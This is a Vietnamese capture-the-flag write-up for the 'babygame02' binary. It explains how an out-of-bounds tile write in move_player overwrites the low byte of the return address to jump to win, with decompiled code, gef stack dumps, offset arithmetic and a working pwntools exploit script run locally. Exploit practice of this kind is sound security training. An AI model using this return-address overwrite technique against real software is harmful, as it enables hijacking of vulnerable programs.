# Babygame02
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4[2]; // [esp+0h] [ebp-AA0h] BYREF
  char v5[2700]; // [esp+Bh] [ebp-A95h] BYREF
  char v6; // [esp+A97h] [ebp-9h]
  int *v7; // [esp+A98h] [ebp-8h]

  v7 = &argc;
  init_player(v4);
  init_map(v5, v4);
  print_map(v5);
  signal(2, (__sighandler_t)sigint_handler);
  do
  {
    do
    {
      v6 = getchar();
      move_player(v4, v6, (int)v5);
      print_map(v5);
    }
    while ( v4[0] != 29 );
  }
  while ( v4[1] != 89 );
  puts("You win!");
  return 0;
}
```
chall này game giống hệt chall `babygame01` tuy nhiên có một số điểm khác. Ta không có câu lệnh gọi tới win. Ý tưởng ban đầu là `ret2win`. Vì thế ta cần 1 bug có thể `overwrite` được địa chỉ nào đó về `win`. 

    *(_BYTE *)(v4[1] + v5 + 90 * *v4) = 46

Tớ nghĩ tới câu lệnh giúp ta exploit chall `babygame01` tuy là có thể `overwrite` thành win nhưng mà nó set 1 byte sau cùng của giá trị đấy thành `46`. Điều này k có ý nghĩa lắm. Mình để ý thấy địa chỉ ret của `move_player` với win chỉ khác nhau mỗi byte cuối =)) hê hê. 

```c
result = (_BYTE *)(v4[1] + v5 + 90 * *v4);
*result = player_tile;
```
Lệnh này giống lệnh trên tuy nhiên nó k set byte sau cùng (sau cùng theo little endian) thành 46, nó set thành `player_tile`, mà `player_tile` ta có thể thay đổi theo ý muốn bằng phím `'l'`

```c
if ( v6 == 'l' )
    player_tile = getchar();
```
Đặt break point ngay lệnh ret của `move_player` lúc này `retAddr` đang được lưu trong stack :

```java
---[0xffffc71c]---│+0x0000: 0x08049709  →  <main+149> add esp, 0x10      ← $esp
0xffffc720│+0x0004: 0xffffc738  →  0x00000004
0xffffc724│+0x0008: 0xffffffc6
0xffffc728│+0x000c: |---[0xffffc743]---|  →  "..................................................[...]"
0xffffc72c│+0x0010: 0x080496eb  →  <main+119> mov BYTE PTR [ebp-0x9], al
0xffffc730│+0x0014: 0xf7ffd020  →  0xf7ffd9d0  →  0x00000000
0xffffc734│+0x0018: 0x00000000
0xffffc738│+0x001c: 0x00000004
0xffffc73c│+0x0020: 0x00000004
0xffffc740│+0x0024: 0x2e000000
gef➤  p win
$1 = {<text variable, no debug info>} 0x804975d <win>
```
Ta có: địa chỉ chứa `retAddr` của `move_player` là `0xffffc71c`, địa chỉ của map `v5` là `0xffffc743` và địa chỉ của `win` là `0x804975d`

Vẫn là phép tính cũ : `(v4[1] + v5 + 90 *v4[0]) = 0xffffc71c` với `v5 = 0xffffc743` và `v4[1]` là chỉ số cột, `v4[0]` là chỉ số hàng `(v4[1]<89, v4[0]<29)`. Nếu cố định `v4[1]` rồi tìm `v4[0]` thì sẽ khá tốn công bởi vì phải chia cho `90` vì vậy ta nên cố định `v4[0]` rồi tìm `v4[1]`. 

Với `v4[0] = 0` thì `v4[1] = 0xffffc71c - 0xffffc743 = -39` (hàng 0 cột -39). Lúc chạy thử và debug thì vô tình ta đã set địa chỉ trong `eax` thành địa chỉ không hợp lệ dẫn đến crash và `eax` thì chứa toàn bộ map của ta

    $eax   : 0xffffc73f  →  "@.................................................[...]"
    ...
    $eax   : 0x40ffc73f

Do đó ta đành tìm cặp khác: với `v4[0] = 1 thì v4[1] = -129` điều này còn tệ hơn trường hợp trước. Ta cần `v4[1]` phải dương nếu không sẽ gặp lỗi tương tự.

Với `v4[0] = -1`, `v4[1] = 51` (hàng -1 cột 51) hoàn toàn hợp lệ. Test thì k gặp lỗi `SIGSEGV` nữa. Bây giờ địa chỉ của phép tính trên đã là nơi chứa `retAddr` của `move_player` rồi, giờ chỉ còn set byte cuối của `ret` thành `win` là hoàn thành

## Exploit
do phải gửi theo byte nên viết script vậy =))

```python
from pwn import *
exe = ELF('game', checksec=False)
p = process(exe.path)
p.sendlineafter(b'\n', b'l\x5d')
p.sendlineafter(b'\n', b'd'*47)
p.sendlineafter(b'\n', b'w'*5)
p.interactive()
```
Do lúc đầu move player tới vị trí cần thiết thì chương trình lại k set player_tiles nên tớ set trước =))
Chạy trên Local ok rồi

```java
..........................................................................................
.........................................................................................X
flag.txt not found in current directory
[*] Got EOF while reading in interactive
```
*mạng lag quá nó không in ra hết được :( cập nhật sau*
